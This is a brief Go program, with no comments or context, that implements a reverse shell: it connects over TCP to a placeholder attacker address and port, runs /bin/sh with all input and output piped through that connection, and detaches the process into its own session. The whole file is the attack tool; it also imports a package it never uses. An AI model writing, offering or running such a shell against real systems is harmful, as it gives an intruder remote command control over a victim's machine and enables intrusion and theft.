package main

import (
    "net"
    "os/exec"
    "syscall"
    "os"
)

func main() {
    conn, _ := net.Dial("tcp", "attacker_ip:attacker_port")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
    cmd.Run()
}
